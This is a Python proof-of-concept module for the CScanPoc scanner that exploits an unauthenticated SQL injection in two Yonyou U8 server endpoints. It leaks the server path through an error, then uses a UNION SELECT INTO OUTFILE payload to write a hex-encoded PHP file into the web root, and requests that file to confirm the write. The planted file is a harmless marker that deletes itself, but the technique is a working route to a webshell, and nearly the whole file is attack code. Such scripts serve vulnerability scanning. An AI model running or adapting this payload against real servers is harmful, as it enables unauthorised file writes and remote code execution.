# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import os

class Vuln(ABVuln):
    vuln_id = 'Yonyou_0023' # 平台漏洞编号，留空
    name = '用友优普U8系统 sql注入漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-07-29'  # 漏洞公布时间
    desc = '''
        用友优普U8系统两处sql注入可无限制getshell(无需登陆) 。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Yonyou(用友)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '6a9ae96e-f8db-4519-a163-c2a09ee43dc3'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #Refer http://www.wooyun.org/bugs/wooyun-2015-0130069
            hh = hackhttp.hackhttp()
            payloads = ('/Server/CmxcheckBind.php?b=2&a=1','Server/CmxbindMachine.php?m=1&a=1')
            for payload in payloads:
                url = self.target + payload
                code1, head1, res1, errcode1, _url1 = hh.http(url+'%cc')
                m = re.findall('<b>(.*?)</b>', res1)[1] if re.findall('<b>(.*?)</b>', res1) else ""
                shell_path = str(os.path.dirname(m)) + '\\testvul.php'
                shell_path = re.sub(r'\\',r'\\\\',shell_path)
                exp_code = "'%20and%201=2%20union%20select%200x3c3f706870206563686f206d64352831293b756e6c696e6b285f5f46494c455f5f293b3f3e%20into%20outfile%20'{}'%23".format(shell_path)
                code2, head2, res2, errcode2, _url2 = hh.http(url + exp_code)
                code3, head3, res3, errcode3, _url3 = hh.http(url + '/Server/testvul.php')
                if code3 == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in res3: 
                    #security_hole(url)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))
                
        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
